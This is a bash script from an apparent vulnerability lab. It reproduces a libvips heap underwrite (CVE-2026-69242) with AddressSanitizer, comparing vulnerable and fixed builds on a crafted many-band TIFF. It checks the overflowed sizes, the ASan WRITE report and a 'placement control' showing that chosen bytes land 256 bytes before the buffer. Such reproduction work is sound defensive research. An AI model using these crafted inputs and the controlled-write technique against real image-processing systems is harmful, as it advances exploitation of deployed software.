#!/usr/bin/env bash
# Reproduce the real-libvips ASan controls for CVE-2026-69242 inside the lab.
# Requires the pinned vulnerable and fixed build directories prepared by
# ../cfg-vuln-asan.log / ../cfg-fixed-asan.log and built with ninja.
set -u
cd "$(dirname "$0")" || exit 1

ROOT=$(cd .. && pwd)
VULN_LIB="$ROOT/build-vuln-asan/libvips"
FIXED_LIB="$ROOT/build-fixed-asan/libvips"
for d in "$VULN_LIB" "$FIXED_LIB"; do
	if [ ! -f "$d/libvips.so.42" ]; then
		echo "MISSING BUILD: $d" >&2
		exit 2
	fi
done

python3 mktiff.py manyband.tif 107374 2 10000 32 3 || exit 1

INC="$(pkg-config --cflags glib-2.0 gobject-2.0) -I$ROOT/src/libvips-8.18.2/libvips/include"
LIB=$(pkg-config --libs glib-2.0 gobject-2.0)
CFLAGS="-fsanitize=address -fno-omit-frame-pointer -g -O0 -DHAVE_CONFIG_H"

gcc $CFLAGS -I"$ROOT/build-vuln-asan" -I"$ROOT/build-vuln-asan/libvips/include" \
	$INC -o probe-vuln probe.c -L"$VULN_LIB" -lvips $LIB || exit 1
gcc $CFLAGS -I"$ROOT/build-fixed-asan" -I"$ROOT/build-fixed-asan/libvips/include" \
	-I"$ROOT/src/libvips-fixed/libvips/include" $INC -o probe-fixed probe.c \
	-L"$FIXED_LIB" -lvips $LIB || exit 1

run() {
	local lib=$1 bin=$2 out=$3
	shift 3
	LD_LIBRARY_PATH="$lib" ASAN_OPTIONS=detect_leaks=0 "$@" "./$bin" manyband.tif \
		>"$out" 2>&1
}

run "$VULN_LIB" probe-vuln asan-vuln.out env || true
run "$FIXED_LIB" probe-fixed asan-fixed.out env SKIP_CHAIN=1 || true
run "$VULN_LIB" probe-vuln placement.out env PLACEMENT_SHIFT=512 || true

fail=0
check() {
	if grep -qF "$2" "$1"; then
		echo "PASS $1 :: $2"
	else
		echo "FAIL $1 :: $2"
		fail=1
	fi
}

# Vulnerable build: real crafted TIFF header passes sanity, real ASan WRITE
# at the pinned memcpy line, 256 bytes before the region base.
check asan-vuln.out 'TIFF_LOAD=OK filename=manyband.tif'
check asan-vuln.out 'TIFF_HDR Xsize=107374 Ysize=2 Bands=10000 BandFmt=6 sizeof_line=4294960000 sizeof_image=8589920000'
check asan-vuln.out 'TIFF_SANITY=1 msg='
check asan-vuln.out 'BPL=-256 LSKIP=18446744073709551360'
check asan-vuln.out 'WRITE of size 16'
check asan-vuln.out 'vips_region_paint_pel ../src/libvips-8.18.2/libvips/iofuncs/region.c:1004'

# Fixed build: same TIFF rejected at load, no chain attempted.
check asan-fixed.out 'TIFF_LOAD=ERR msg=image: dimension overflow'
check asan-fixed.out 'CHAIN_SKIPPED=1'

# Placement control: chosen ink lands at DATA-0x100, observed in the buffer.
check placement.out 'CRAFT256 AFTER byte[0]=11 byte[1]=11 byte[256]=5a'

echo "RESULT fail=$fail"
exit "$fail"
